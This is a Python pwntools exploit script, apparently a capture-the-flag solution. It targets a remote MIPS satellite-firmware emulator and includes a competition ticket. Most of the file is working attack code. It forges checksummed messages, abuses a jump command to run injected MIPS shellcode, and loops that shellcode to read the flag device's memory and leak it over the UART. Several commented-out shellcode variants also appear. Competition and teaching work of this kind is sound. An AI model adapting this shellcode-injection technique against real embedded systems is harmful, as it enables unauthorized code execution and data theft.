"""
Mapping ROM image (firmware.rom, 6091 words) to physical address 0x1fc00000
Mapping RAM module (host=0x7fc9cfa71010, 2929KB) to physical address 0x0
Mapping Timer device to physical address 0x01010000
Connected IRQ7 to the Timer device
Mapping Sensor device to physical address 0x02100000
Mapping Flag Device to physical address 0x02008000
Mapping Synova UART to physical address 0x02000000
Connected IRQ3 to the Synova UART
Mapping Synova UART to physical address 0x02000010
Connected IRQ4 to the Synova UART
Connected IRQ5 to the Synova UART

"""

from pwn import *

context.arch = 'mips'

REMOTE = True

if REMOTE:
	r = remote("elite-poet.satellitesabove.me", 5012)
	r.sendlineafter("Ticket please:", "ticket{bravo815882quebec2:GDs6_fBldT0UIohYdZE0xbw4mUJAFDURD5pnL0S-OL2PxxsfSZFw9mHoHEZkGD4FHg}")
else:
	r = process(["./vmips", "-o", "fpu", "-o", "memsize=3000000", "firmware.rom"])
	#util.misc.run_in_new_terminal(f"tail -f /proc/{r.pid}/fd/4")
	r.recvuntil("*************RESET*************\n\n")

print("First recv: ", r.recvn(16))

def send_bytes(data):
	assert(len(data) == 0x3e)
	r.send(b'\xa5\x5a' + data)
	#print(hexdump(data))

def send_msg(msgtype, payload):
	payload = payload.ljust(0x3c, b'\x00')[:0x3c]
	checksum = 255 - (sum(payload) + msgtype) % 256
	send_bytes(p8(msgtype) + p8(checksum) + payload)

def jump_to(addr):
	send_msg(0x5c, p32(addr))

def run_shellcode(shellcode):
	#assert len(shellcode) == 14 * 4 # 0x3c total payload bytes - 4 for the return address
	shellcode = b'\x13\x37' + shellcode
	# while len(shellcode) < 14*4:
	# 	shellcode += bytes.fromhex("00000000") # asm('nop')
	shellcode_addr = 0xa00ffffc - 0x1040 + 0x10 + 8
	send_msg(0x5c, p32(shellcode_addr) + shellcode)

# sc = asm(f"""
# 	lui $v0, 0xa200
# 	ori $v0, $v0, 0x000c
# 	li $t1, 33
# 	sb $t1, 0x0($v0)
# 	j {0xa00ffffc - 0x1040 + 16 + 4}
# 	nop
# 	nop
# 	nop
# """)

# infinite_loop = asm(f"""
# 	j {0xa00ffffc - 0x1040 + 0x10 + 8}
# 	nop
# """)

# infinite_debug_uart_loop = asm(f"""
# 	nop
# 	lui $v0, 0xa200
# 	ori $v0, $v0, 0x000c
# 	li $t1, 33
# 	sb $t1, 0x0($v0)
# 	j {0xa00ffffc - 0x1040 + 0x10 + 8}
# 	nop
# """)

# infinite_stdout_uart_loop = asm(f"""
# 	li $v0, 0xa200001c
# 	li $t1, 33
# 	sb $t1, 0x0($v0)
# 	li $v0, {0xa00ffffc - 0x1040 + 0x10 + 8}
# 	jr $v0
# 	nop
# """)

# goto_main = asm(f"""
# 	li $v0, 0xbfc0578c
# 	jr $v0
# 	nop
# """)

i = 1
while i < 15:
	outputty = asm(f"""
		li $v0, 0xa0180600
		li $v1, 0xa2008000
		lw $t0, {8*i}($v1)
		sw $t0, 0($v0)
		lw $t0, {8*i+4}($v1)
		sw $t0, 4($v0)
		li $ra, 0xbfc05048
		jr $ra
		nop
	""")

	print("Running", i)
	run_shellcode(outputty)
	print(r.recvn(16))
	send_msg(0x40, b"mamamiapizzeria"*10)
	r.recvuntil("mamamiap\x00\x00\x00\x00\x00\x00\x00\x00")
	i += 1

"""	if r.recvuntil("flag", timeout=3).endswith(b"flag"):
		print(i, r.recvn(4))
		i += 1
	else:

"""